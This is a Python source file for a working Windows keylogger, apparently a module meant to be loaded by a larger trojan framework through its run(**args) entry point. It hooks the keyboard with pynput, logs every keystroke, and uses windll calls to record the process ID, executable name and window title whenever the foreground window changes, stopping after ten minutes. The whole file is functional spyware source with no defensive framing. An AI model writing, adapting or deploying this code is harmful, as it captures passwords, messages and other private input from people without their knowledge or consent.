from ctypes import byref, create_string_buffer, c_long, windll
from pynput import keyboard
import time

TIMEOUT = 60 * 10  # 10 minutes

class Keylogger:
    def __init__(self):
        self.current_window_handle = None

    def get_current_process(self):
        hwnd = windll.user32.GetForegroundWindow()
        pid = c_long(0)
        windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))

        executable = create_string_buffer(512)
        h_process = windll.kernel32.OpenProcess(0x400 | 0x10, False, pid.value)
        windll.psapi.GetModuleBaseNameA(h_process, None, executable, 512)

        window_title = create_string_buffer(512)
        windll.user32.GetWindowTextA(hwnd, window_title, 512)

        try:
            window_name = window_title.value.decode()
        except UnicodeDecodeError:
            window_name = "Unknown"

        print(f'\n[PID: {pid.value}] {executable.value.decode()} - {window_name}')

        windll.kernel32.CloseHandle(hwnd)
        windll.kernel32.CloseHandle(h_process)

        self.current_window_handle = hwnd  # Save current window handle

    def mykeystroke(self, key):
        new_window = windll.user32.GetForegroundWindow()
        if new_window != self.current_window_handle:
            self.get_current_process()

        try:
            if hasattr(key, 'char') and key.char is not None:
                print(key.char, end='', flush=True)
            else:
                print(f'[{key}]', end='', flush=True)
        except Exception as e:
            print(f'[Error capturing key: {e}]', flush=True)

def run(**args):
    kl = Keylogger()
    kl.get_current_process()  # Initialize first window

    start_time = time.time()

    def on_press(key):
        kl.mykeystroke(key)
        if time.time() - start_time > TIMEOUT:
            return False  # Stop listener

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()